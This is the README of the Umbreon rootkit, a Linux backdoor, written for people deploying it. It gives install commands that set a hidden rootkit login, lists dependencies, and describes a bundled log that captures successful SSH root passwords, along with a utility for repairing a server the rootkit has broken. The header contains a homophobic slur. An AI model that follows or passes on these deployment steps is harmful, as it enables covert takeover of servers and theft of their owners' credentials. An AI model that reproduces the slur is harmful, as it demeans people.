Umbreon Rootkit
------------------------------------------------------------------------------------------------------------------------------
You're Welcome Faggots!
------------------------------------------------------------------------------------------------------------------------------
Dependencies: OpenSSL binaries, libs, headers (or a smart user)
Password hashing format is Whirlpool. There's a tool included in utils.
The installer actually uses this, but your mileage may vary compiling it
on strange systems. If you run into issues just edit the installer script a bit.
Bring a static-compiled pwgen and unfuck if you're desperate to get it working
------------------------------------------------------------------------------------------------------------------------------
To use(Don't be stupid!)
bash setup
bash root.sh [USERNAME] [PASSWORD] - This will set the login to the rootkit user
------------------------------------------------------------------------------------------------------------------------------
Extra Files:
portchecker | checks specified port
promptlog | successful SSH root passwords
------------------------------------------------------------------------------------------------------------------------------
To Fix Server If #RIPed
compile and run utils/unfuck.c